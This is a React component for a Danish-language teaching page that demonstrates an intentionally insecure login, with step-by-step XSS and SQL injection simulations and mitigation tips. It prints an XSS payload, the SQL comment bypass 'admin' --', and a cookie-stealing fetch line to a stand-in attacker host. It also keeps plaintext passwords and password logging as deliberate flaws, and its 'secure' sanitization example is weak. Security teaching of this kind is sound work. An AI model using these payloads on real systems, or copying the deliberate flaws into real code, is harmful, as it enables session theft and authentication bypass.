import { useState, FormEvent } from 'react';
import { Box, TextInput, PasswordInput, Button, Title, Text, Container, Paper, Group, Alert, Divider, List, Badge, SimpleGrid, Modal, Card, Accordion, ThemeIcon, Tabs, Stepper } from '@mantine/core';
import { WarningOctagon, Skull, CodeBlock, Check, Lightning, ShieldSlash, Eye, EyeSlash, LockKeyOpen, ArrowRight, Warning } from '@phosphor-icons/react';

type User = {
	username: string;
	password: string;
};

function LoginUnsafe() {
	const [username, setUsername] = useState<string>('');
	const [password, setPassword] = useState<string>('');
	const [loginMessage, setLoginMessage] = useState<string>('');
	const [isHacked, setIsHacked] = useState<boolean>(false);
	const [attackType, setAttackType] = useState<string>('');
	const [showLoginForm, setShowLoginForm] = useState<boolean>(true);
	const [showXssModal, setShowXssModal] = useState<boolean>(false);
	const [showSqlModal, setShowSqlModal] = useState<boolean>(false);
	const [activeAttackStep, setActiveAttackStep] = useState<number>(0);
	const [_attackProgress, setAttackProgress] = useState<number>(0);
	const [learnedVulnerabilities, setLearnedVulnerabilities] = useState<string[]>([]);

	const users: User[] = [
		{ username: 'admin', password: 'password123' },
		{ username: 'user', password: '12345' },
		{ username: 'enigma', password: 'museum' },
	];

	const handleLogin = (e: FormEvent<HTMLFormElement>) => {
		e.preventDefault();

		// If the XSS attack was triggered, show the visual simulation
		if (username.includes('<script') || username.includes('<img') || username.includes('onerror')) {
			setShowXssModal(true);
			trackVulnerabilityLearned('xss');
			return;
		}

		// For SQL Injection demo - automatic success for "admin' --"
		if (username.includes("admin'") && username.includes('--')) {
			setLoginMessage(`Login successful for admin`);
			trackVulnerabilityLearned('sql');
			return;
		}

		const user = users.find((u) => u.username === username && u.password === password);

		if (user) {
			setLoginMessage(`Login successful for ${username}`);
			console.log(`User logged in: ${username}, Password used: ${password}`);
		} else {
			const userExists = users.some((u) => u.username === username);
			if (userExists) {
				setLoginMessage(`Incorrect password for user: ${username}`);
				trackVulnerabilityLearned('specific-errors');
			} else {
				setLoginMessage(`User not found: ${username}`);
				trackVulnerabilityLearned('specific-errors');
			}
		}
	};

	const trackVulnerabilityLearned = (vulnerability: string) => {
		if (!learnedVulnerabilities.includes(vulnerability)) {
			setLearnedVulnerabilities([...learnedVulnerabilities, vulnerability]);
		}
	};

	const handleXSSAttack = () => {
		setUsername(`<img src="x" onerror="alert('XSS Attack!')">`);
		setAttackType('xss');
		setIsHacked(true);
		setShowLoginForm(false);
		setActiveAttackStep(0);
		startAttackSimulation('xss');
	};

	const handleSQLInjection = () => {
		setUsername("admin' --");
		setPassword('anything');
		setAttackType('sql');
		setIsHacked(true);
		setShowLoginForm(false);
		setActiveAttackStep(0);
		startAttackSimulation('sql');
	};

	const startAttackSimulation = (_type: string) => {
		setAttackProgress(0);
		const interval = setInterval(() => {
			setAttackProgress((prev) => {
				if (prev >= 100) {
					clearInterval(interval);
					return 100;
				}
				return prev + 10;
			});
		}, 200);
	};

	const continueAttack = () => {
		setShowLoginForm(true);
	};

	const completeAttackStep = () => {
		if (attackType === 'xss') {
			if (activeAttackStep < xssAttackSteps.length - 1) {
				setActiveAttackStep((prev) => prev + 1);
			} else {
				setShowXssModal(true);
				setActiveAttackStep(0);
				setShowLoginForm(true);
			}
		} else if (attackType === 'sql') {
			if (activeAttackStep < sqlInjectionSteps.length - 1) {
				setActiveAttackStep((prev) => prev + 1);
			} else {
				setShowSqlModal(true);
				setActiveAttackStep(0);
				setShowLoginForm(true);
			}
		}
	};

	const xssAttackSteps = [
		{
			title: 'Indsæt XSS Payload',
			description: 'Angriberen indsætter en ondsindet JavaScript-kode i en inputfelt, som f.eks. brugernavnfeltet.',
			code: `<img src="x" onerror="alert('XSS Attack!')">`,
		},
		{
			title: 'Server Gemmer Data Usaniteret',
			description: 'En usikker server gemmer inputtet uden at sanitere farlige HTML-tags eller JavaScript.',
			code: `// Usikker kode på server:
const saveUsername = (username) => {
  database.save(username); // Gemmer rå input uden sanitering
};`,
		},
		{
			title: 'Data Vises For Andre Brugere',
			description: 'Når andre brugere indlæser siden, kører den indlejrede kode i deres browser.',
			code: `// Usikker kode på server:
const displayUserComment = (comment) => {
  return \`<div>\${comment}</div>\`; // Indlejrer rå input direkte i HTML
};`,
		},
		{
			title: 'Ondsindet Kode Udføres',
			description: 'JavaScript koden kører i offerets browser, hvilket giver angriberen adgang til cookies, sessionsdata og mere.',
			code: `// Hvad der faktisk udføres i offerets browser:
<div>
  <img src="x" onerror="
    fetch('https://hackere.dk/steal?cookie=' + document.cookie);
  ">
</div>`,
		},
	];

	const sqlInjectionSteps = [
		{
			title: 'Indsæt SQL Injection Payload',
			description: 'Angriberen indsætter SQL-syntaks i inputfeltet for at manipulere databaseforespørgslen.',
			code: `Brugernavn: admin' --
Adgangskode: anything`,
		},
		{
			title: 'Usikker SQL Forespørgsel',
			description: 'Serveren konstruerer en SQL-forespørgsel ved direkte at indsætte brugerens input.',
			code: `// Usikker kode på server:
const query = \`SELECT * FROM users 
  WHERE username = '\${username}' 
  AND password = '\${password}'\`;`,
		},
		{
			title: 'Forespørgsel Ændres',
			description: 'Med injection bliver forespørgslen ændret til noget andet end udviklerens hensigt.',
			code: `// Oprindelig tilsigtet forespørgsel:
SELECT * FROM users WHERE username = 'admin' AND password = 'anything'

// Faktisk udført forespørgsel efter injection:
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything'`,
		},
		{
			title: 'Adgangskode Bypass',
			description: 'Dobbelt bindestreg (--) kommenterer resten af forespørgslen ud, så password-tjekket ignoreres.',
			code: `// Forklaring:
'admin' --  ← Alt efter -- bliver ignoreret som en kommentar

// Serveren ser kun:
SELECT * FROM users WHERE username = 'admin'`,
		},
	];

	const vulnerabilities = [
		{
			id: 'no-csrf',
			title: 'Ingen CSRF-beskyttelse',
			description: 'Uden CSRF-tokens kan angribere få brugerens browser til at udføre uønskede handlinger på websteder, hvor brugeren er logget ind.',
			code: `// Sikker kode ville have:
<input type="hidden" name="csrf_token" value="${Math.random().toString(36).substring(2, 15)}" />

// Tjek på server:
if (request.body.csrf_token !== session.csrf_token) {
  return error('Ugyldig CSRF token');
}`,
			icon: <WarningOctagon weight='fill' />,
			learned: learnedVulnerabilities.includes('no-csrf'),
		},
		{
			id: 'no-rate-limit',
			title: 'Ingen Rate Limiting',
			description: 'Uden begrænsning på antal loginforsøg kan angribere bruge brute force til at gætte adgangskoder ved at prøve tusindvis af kombinationer.',
			code: `// Sikker kode ville have:
if (loginAttempts >= 5) {
  lockAccount(username, '15 minutes');
  return error('For mange loginforsøg. Prøv igen senere.');
}`,
			icon: <WarningOctagon weight='fill' />,
			learned: learnedVulnerabilities.includes('no-rate-limit'),
		},
		{
			id: 'no-xss-protection',
			title: 'Ingen XSS-beskyttelse',
			description: 'Uden input-sanitering kan angribere indsprøjte ondsindet JavaScript-kode, der udføres i andre brugeres browsere.',
			code: `// Usikker kode:
document.getElementById('profile').innerHTML = userInput;

// Sikker kode ville have:
const sanitizeInput = (input) => {
  return input.replace(/[<>]/g, '');
};`,
			icon: <WarningOctagon weight='fill' />,
			learned: learnedVulnerabilities.includes('xss'),
		},
		{
			id: 'specific-errors',
			title: 'Usikker fejlhåndtering',
			description: 'Specifikke fejlmeddelelser afslører oplysninger om systemet, som en angriber kan bruge til at målrette deres angreb.',
			code: `// Usikker kode:
if (!userExists) {
  return error('Bruger findes ikke');
} else if (password !== user.password) {
  return error('Forkert adgangskode');
}

// Sikker kode ville have:
if (!authenticated) {
  return error('Ugyldigt brugernavn eller adgangskode');
}`,
			icon: <WarningOctagon weight='fill' />,
			learned: learnedVulnerabilities.includes('specific-errors'),
		},
		{
			id: 'plaintext-passwords',
			title: 'Usikker password lagring',
			description: 'Adgangskoder opbevares i klartekst i stedet for at blive hashet og saltet, hvilket betyder at de kan læses direkte hvis databasen kompromitteres.',
			code: `// Usikker kode:
const users = [
  { username: 'admin', password: 'password123' },
  { username: 'user', password: '12345' }
];

// Sikker kode ville have:
const users = [
  { username: 'admin', passwordHash: '$2a$10$XJpq.zya1...' },
  { username: 'user', passwordHash: '$2a$10$dRs7hkP...' }
];`,
			icon: <WarningOctagon weight='fill' />,
			learned: learnedVulnerabilities.includes('plaintext-passwords'),
		},
	];

	// XSS attack modal simulation
	const XssAttackModal = () => (
		<Modal
			opened={showXssModal}
			onClose={() => setShowXssModal(false)}
			title={
				<div className='flex items-center'>
					<Lightning size={20} className='mr-2 text-yellow-400' weight='fill' />
					XSS Angreb Udført!
				</div>
			}
			centered
			overlayProps={{
				color: '#000',
				opacity: 0.65,
				blur: 3,
			}}
			classNames={{
				header: 'bg-red-800 text-white p-3',
				title: 'font-bold',
				body: 'bg-red-900 p-4 text-white',
			}}
			size='lg'
		>
			<div className='mb-4 bg-black/40 p-3 rounded'>
				<Text size='sm' fw='bold' mb={8} className='flex items-center'>
					<ShieldSlash className='mr-2 text-red-400' size={18} weight='fill' />
					Dette ville ske i en sårbar applikation:
				</Text>

				<div className='border border-red-500 p-3 text-center bg-black/30 rounded'>
					<div className='text-yellow-300 font-mono mb-2 text-sm'>alert("XSS Attack!")</div>
					<Badge color='red' size='lg'>
						JavaScript kode er blevet udført!
					</Badge>
				</div>
			</div>

			<SimpleGrid cols={2} spacing='md' className='mb-4'>
				<Card withBorder p='sm' className='bg-red-900/30'>
					<Title order={5} mb={8} size='sm'>
						Hvad skete der?
					</Title>
					<Text size='sm'>Dit input indeholdt HTML og JavaScript kode. Da serveren ikke saniterede dette input, blev koden indlejret i siden og udført i browseren. I en rigtig applikation kunne denne kode stjæle dine cookies, sessionsdata, eller endda omdirigere dig til et falsk websted.</Text>
				</Card>

				<Card withBorder p='sm' className='bg-green-900/30'>
					<Title order={5} mb={8} size='sm'>
						Hvordan forhindres dette?
					</Title>
					<List size='sm' spacing='xs'>
						<List.Item>Sanitér alt brugerinput før det gemmes eller vises</List.Item>
						<List.Item>Anvend Content Security Policy (CSP) for at begrænse JavaScript-udførelse</List.Item>
						<List.Item>Brug frameworks som React, der automatisk eskaperer HTML</List.Item>
						<List.Item>Implementér HTTP-only cookies for at beskytte sessions</List.Item>
					</List>
				</Card>
			</SimpleGrid>

			<Button fullWidth color='red' onClick={() => setShowXssModal(false)}>
				Jeg forstår risikoen
			</Button>
		</Modal>
	);

	// SQL Injection modal
	const SqlInjectionModal = () => (
		<Modal
			opened={showSqlModal}
			onClose={() => setShowSqlModal(false)}
			title={
				<div className='flex items-center'>
					<Lightning size={20} className='mr-2 text-orange-400' weight='fill' />
					SQL Injection Succesfuld!
				</div>
			}
			centered
			overlayProps={{
				color: '#000',
				opacity: 0.65,
				blur: 3,
			}}
			classNames={{
				header: 'bg-orange-800 text-white p-3',
				title: 'font-bold',
				body: 'bg-orange-900 p-4 text-white',
			}}
			size='lg'
		>
			<div className='mb-4 bg-black/40 p-3 rounded'>
				<Text size='sm' fw='bold' mb={8} className='flex items-center'>
					<ShieldSlash className='mr-2 text-orange-400' size={18} weight='fill' />
					Dette ville ske i en sårbar applikation:
				</Text>

				<div className='border border-orange-500 p-3 bg-black/30 rounded'>
					<div className='text-yellow-300 font-mono mb-2 text-sm'>SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything'</div>
					<Group justify='center'>
						<Badge color='orange' size='lg'>
							Adgangskode Bypass!
						</Badge>
					</Group>
				</div>
			</div>

			<SimpleGrid cols={2} spacing='md' className='mb-4'>
				<Card withBorder p='sm' className='bg-orange-900/30'>
					<Title order={5} mb={8} size='sm'>
						Hvad skete der?
					</Title>
					<Text size='sm'>SQL-injektionen brugte kommentar-syntaksen (--) til at få databasen til at ignorere adgangskode-tjekket. Dette gav ubegrænset adgang til admin-kontoen uden at kende den korrekte adgangskode.</Text>
				</Card>

				<Card withBorder p='sm' className='bg-green-900/30'>
					<Title order={5} mb={8} size='sm'>
						Hvordan forhindres dette?
					</Title>
					<List size='sm' spacing='xs'>
						<List.Item>Brug parameteriserede forespørgsler eller prepared statements</List.Item>
						<List.Item>Anvend ORM (Object-Relational Mapping) værktøjer</List.Item>
						<List.Item>Validér og rens alt brugerinput</List.Item>
						<List.Item>Implementér principle of least privilege for databasebruger</List.Item>
					</List>
				</Card>
			</SimpleGrid>

			<Button fullWidth color='orange' onClick={() => setShowSqlModal(false)}>
				Jeg forstår risikoen
			</Button>
		</Modal>
	);

	return (
		<Box p='xl'>
			<Container size='xl'>
				<SimpleGrid cols={2} spacing='xl'>
					<Box>
						<Paper withBorder p='lg' radius='md' className='bg-red-800/20 text-white mb-6'>
							<Group justify='space-between' mb='lg'>
								<Group>
									<WarningOctagon size={30} className='text-red-400' weight='fill' />
									<Title order={2}>Usikker Login</Title>
								</Group>
								<Badge color='red' size='lg'>
									USIKKER
								</Badge>
							</Group>

							<Alert color='red' mb={16} className='bg-red-900/30 border-red-500'>
								<Text fw='bold' mb={4}>
									Undervisningsformål
								</Text>
								<Text size='sm'>Denne side demonstrerer bevidst usikre login-metoder. Brug aldrig disse teknikker i rigtige systemer!</Text>
							</Alert>

							<Text size='md' className='mb-4'>
								Denne usikre loginside er sårbar over for forskellige angreb. Du kan logge ind med følgende legitimationsoplysninger:
							</Text>

							<Text className='bg-red-900/50 p-3 rounded mb-4 font-mono text-sm'>
								Brugernavn: admin
								<br />
								Adgangskode: password123
							</Text>

							<Divider my='md' />

							{showLoginForm ? (
								<>
									<form onSubmit={handleLogin}>
										<TextInput
											label='Brugernavn'
											placeholder='Indtast brugernavn'
											required
											value={username}
											onChange={(e) => setUsername(e.target.value)}
											mb={12}
											classNames={{
												input: isHacked ? 'border-2 border-yellow-400' : '',
											}}
										/>

										<PasswordInput label='Adgangskode' placeholder='Indtast adgangskode' required value={password} onChange={(e) => setPassword(e.target.value)} mb={16} visibilityToggleIcon={({ reveal }) => (reveal ? <EyeSlash size={16} /> : <Eye size={16} />)} />

										{loginMessage && (
											<Alert color={loginMessage.includes('not found') || loginMessage.includes('Incorrect') ? 'red' : 'green'} mb={16}>
												{loginMessage}
											</Alert>
										)}

										<Button type='submit' fullWidth color='red' mb={12} size='md'>
											<LockKeyOpen size={20} className='mr-2' weight='fill' />
											Log ind (Usikkert)
										</Button>
									</form>

									<Divider label='Angrebssimuleringer' labelPosition='center' my='md' />

									<Text size='sm' className='mb-4'>
										Prøv disse simulerede angreb for at se, hvordan en usikker login-side kan udnyttes:
									</Text>

									<SimpleGrid cols={2} spacing='md'>
										<Card withBorder className='bg-red-900/20'>
											<Group justify='space-between' mb={8}>
												<Text fw='bold' size='sm'>
													XSS-angreb
												</Text>
												{learnedVulnerabilities.includes('xss') && (
													<Badge color='green' variant='light' size='sm'>
														Oplevet
													</Badge>
												)}
											</Group>
											<Text size='xs' mb={12}>
												Cross-Site Scripting indsprøjter ondsindet kode, der kan stjæle brugerdata.
											</Text>
											<Button variant='filled' size='sm' color='yellow' onClick={handleXSSAttack} leftSection={<CodeBlock weight='bold' size={14} />} fullWidth>
												Simuler XSS-angreb
											</Button>
										</Card>

										<Card withBorder className='bg-red-900/20'>
											<Group justify='space-between' mb={8}>
												<Text fw='bold' size='sm'>
													SQL-injektion
												</Text>
												{learnedVulnerabilities.includes('sql') && (
													<Badge color='green' variant='light' size='sm'>
														Oplevet
													</Badge>
												)}
											</Group>
											<Text size='xs' mb={12}>
												SQL-injektion manipulerer database-forespørgsler for at omgå sikkerhed.
											</Text>
											<Button variant='filled' size='sm' color='orange' onClick={handleSQLInjection} leftSection={<CodeBlock weight='bold' size={14} />} fullWidth>
												Simuler SQL-injektion
											</Button>
										</Card>
									</SimpleGrid>
								</>
							) : (
								<Box>
									{attackType === 'xss' && (
										<Card withBorder className='bg-yellow-900/30 border-yellow-500'>
											<Title order={4} mb={16}>
												XSS Angreb Demonstration
											</Title>
											<Text size='sm' mb={12}>
												Følg disse trin for at forstå, hvordan et XSS-angreb fungerer:
											</Text>

											<Stepper active={activeAttackStep} onStepClick={setActiveAttackStep} color='yellow' orientation='vertical' className='mb-4'>
												{xssAttackSteps.map((step, index) => (
													<Stepper.Step
														key={index}
														label={step.title}
														description={
															<div>
																<Text size='xs' mb={8}>
																	{step.description}
																</Text>
																{activeAttackStep === index && <div className='font-mono text-xs bg-black/50 p-2 rounded border border-yellow-500 mb-2'>{step.code}</div>}
															</div>
														}
													/>
												))}
											</Stepper>

											<Group justify='center'>
												<Button color='yellow' onClick={completeAttackStep} disabled={activeAttackStep === xssAttackSteps.length - 1} rightSection={<ArrowRight size={14} />}>
													Næste trin
												</Button>
												{activeAttackStep === xssAttackSteps.length - 1 && (
													<Button color='yellow' onClick={continueAttack}>
														Afslut demonstration
													</Button>
												)}
											</Group>
										</Card>
									)}

									{attackType === 'sql' && (
										<Card withBorder className='bg-orange-900/30 border-orange-500'>
											<Title order={4} mb={16}>
												SQL Injection Demonstration
											</Title>
											<Text size='sm' mb={12}>
												Følg disse trin for at forstå, hvordan SQL-injektion fungerer:
											</Text>

											<Stepper active={activeAttackStep} onStepClick={setActiveAttackStep} color='orange' orientation='vertical' className='mb-4'>
												{sqlInjectionSteps.map((step, index) => (
													<Stepper.Step
														key={index}
														label={step.title}
														description={
															<div>
																<Text size='xs' mb={8}>
																	{step.description}
																</Text>
																{activeAttackStep === index && <div className='font-mono text-xs bg-black/50 p-2 rounded border border-orange-500 mb-2'>{step.code}</div>}
															</div>
														}
													/>
												))}
											</Stepper>

											<Group justify='center'>
												<Button color='orange' onClick={completeAttackStep} disabled={activeAttackStep === sqlInjectionSteps.length - 1} rightSection={<ArrowRight size={14} />}>
													Næste trin
												</Button>
												{activeAttackStep === sqlInjectionSteps.length - 1 && (
													<Button color='orange' onClick={continueAttack}>
														Afslut demonstration
													</Button>
												)}
											</Group>
										</Card>
									)}
								</Box>
							)}
						</Paper>

						<Paper withBorder p='lg' radius='md' className='bg-red-800/30 text-white'>
							<Title order={4} mb={16}>
								Psykologisk Indsigt
							</Title>

							<Text size='sm' mb={12}>
								Hackere bruger ofte psykologiske teknikker som "social engineering" sammen med tekniske sårbarheder. De udnytter menneskers naturlige tillid og tilbøjelighed til at følge autoriteter.
							</Text>

							<Text size='sm' mb={12}>
								Svage adgangskoder er ofte baseret på personlige oplysninger (fødselsdage, kæledyrs navne), hvilket gør dem sårbare over for angribere, der undersøger deres mål på sociale medier.
							</Text>

							<Text size='sm' fw='bold' mt={16} mb={8}>
								Beskyttelsesstrategier:
							</Text>

							<List size='sm'>
								<List.Item>Brug unikke, komplekse adgangskoder for hver tjeneste</List.Item>
								<List.Item>Aktivér to-faktor autentifikation hvor det er muligt</List.Item>
								<List.Item>Vær forsigtig med, hvilke personlige oplysninger du deler online</List.Item>
								<List.Item>Vær skeptisk over for uventede anmodninger om oplysninger</List.Item>
							</List>
						</Paper>
					</Box>

					<Box>
						<Paper withBorder p='lg' radius='md' className='bg-red-800/30 text-white mb-6'>
							<Title order={3} mb={16} className='flex items-center'>
								<WarningOctagon size={24} className='mr-2 text-red-400' weight='fill' />
								Sikkerhedsproblemer
							</Title>

							<Text size='sm' mb={16}>
								Denne side har bevidst flere sikkerhedssårbarheder. Lær om hver af dem og hvordan de kan udnyttes:
							</Text>

							<Accordion variant='separated'>
								{vulnerabilities.map((vulnerability) => (
									<Accordion.Item key={vulnerability.id} value={vulnerability.id} className={vulnerability.learned ? 'bg-red-900/40 border-red-500' : 'bg-red-900/20'}>
										<Accordion.Control>
											<Group>
												<ThemeIcon color='red' variant='light' size='md'>
													{vulnerability.icon}
												</ThemeIcon>
												<Text fw={500}>{vulnerability.title}</Text>
												{vulnerability.learned && (
													<Badge color='green' variant='light'>
														<Group gap={4}>
															<Check size={14} weight='bold' />
															<Text size='xs'>Forstået</Text>
														</Group>
													</Badge>
												)}
											</Group>
										</Accordion.Control>
										<Accordion.Panel>
											<Text size='sm' mb={12}>
												{vulnerability.description}
											</Text>
											<Title order={6} mb={4}>
												Usikker kode:
											</Title>
											<div className='font-mono text-xs bg-red-950 overflow-x-auto p-2 border border-red-500 rounded mb-4'>{vulnerability.code}</div>
											{!vulnerability.learned && (
												<Text size='xs' c='dimmed'>
													Prøv at opleve denne sårbarhed ved at bruge funktionerne på login-siden.
												</Text>
											)}
										</Accordion.Panel>
									</Accordion.Item>
								))}
							</Accordion>
						</Paper>

						<Paper withBorder p='lg' radius='md' className='bg-red-800/30 text-white'>
							<Group justify='space-between' className='mb-4'>
								<Title order={4} className='flex items-center'>
									<Skull size={20} className='mr-2' weight='fill' />
									Usikker "Database" (Klartekst)
								</Title>
								<Badge color='red' variant='filled'>
									Ekstrem Risiko
								</Badge>
							</Group>

							<Text size='sm' mb={10}>
								I denne demonstration gemmes adgangskoder i klartekst, hvilket er en alvorlig sikkerhedsrisiko. Hvis databasen bliver kompromitteret, får angriberen direkte adgang til alle adgangskoder.
							</Text>

							<div className='font-mono text-xs bg-red-950 overflow-x-auto p-3 border border-red-500 rounded mb-4'>
								{`[
  { username: "admin", password: "password123" },
  { username: "user", password: "12345" },
  { username: "enigma", password: "museum" }
]`}
							</div>

							<Divider my='md' />

							<Title order={5} mb={8}>
								Sikker alternativ (Hashing & Salting)
							</Title>

							<Text size='sm' mb={10}>
								I en sikker implementation ville adgangskoder aldrig gemmes direkte. I stedet gemmes en kryptografisk hash sammen med et unikt "salt" for hver bruger, hvilket gør det ekstremt vanskeligt at gætte adgangskoderne selv hvis databasen bliver kompromitteret.
							</Text>

							<div className='font-mono text-xs bg-green-950 overflow-x-auto p-3 border border-green-500 rounded'>
								{`[
  { 
    username: "admin", 
    passwordHash: "$2a$10$XJpq.zya1Zxebn83nGKVTeQeJa6oMGK76CuUBCxJsCgVuCRXHzgaC",
    salt: "XJpq.zya1Zxebn83nGKVTe"
  },
  { 
    username: "user", 
    passwordHash: "$2a$10$dRs7hkPdq91KvN.2eH9EAOJjG2moPcEW8uUBCYNLjEeeTRAFPtIqq",
    salt: "dRs7hkPdq91KvN.2eH9EA"
  }
]`}
							</div>
						</Paper>
					</Box>
				</SimpleGrid>
			</Container>

			<XssAttackModal />
			<SqlInjectionModal />
		</Box>
	);
}

export default LoginUnsafe;
